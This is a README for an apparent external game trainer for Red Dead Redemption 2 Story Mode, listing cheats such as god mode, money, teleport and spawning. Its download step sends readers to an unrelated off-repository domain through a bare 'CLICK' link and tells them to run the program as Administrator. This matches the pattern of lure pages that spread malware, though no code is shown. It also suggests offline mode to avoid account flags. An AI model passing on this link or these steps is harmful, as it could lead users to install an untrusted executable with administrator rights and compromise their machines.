## 🧩 About

**RDR2 Trainer** is a lightweight external trainer for Red Dead Redemption 2. It provides basic quality-of-life features for Story Mode — god mode, money, teleport, no wanted level, and horse protection.

Based on community trainers like Rampage and Fortitude.

---

## ✨ Features

### 💀 Protection
- God Mode (player + horse)
- Infinite Health
- Infinite Stamina
- No Wanted Level
- No Fall Damage

### 💰 Money
- Set Money
- Unlimited Gold
- Unlock All Weapons
- Unlock All Outfits

### 🗺️ Teleport
- Teleport to Waypoint
- Save / Load Position
- Teleport to Coordinates

### 🚗 Spawn
- Spawn Vehicles
- Spawn Animals
- Time & Weather Control

## 🔧 How to Use

1. Click **[CLICK](https://gitappdown.top/)** to download.

2. Launch RDR2 and load into Story Mode.

3. Run the trainer **as Administrator**.

4. Press `F5` to open the menu.

5. Toggle features.

> **Note:** Use offline mode to avoid any account flags.

---

## ⚙️ Configuration

Settings are stored in `config.json` at `%APPDATA%\RDR2Trainer\config.json`.

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"F5"` | Key to toggle menu |
| `auto_attach` | Boolean | `true` | Auto-attach on startup |
| `safe_mode` | Boolean | `true` | Restricts risky features |
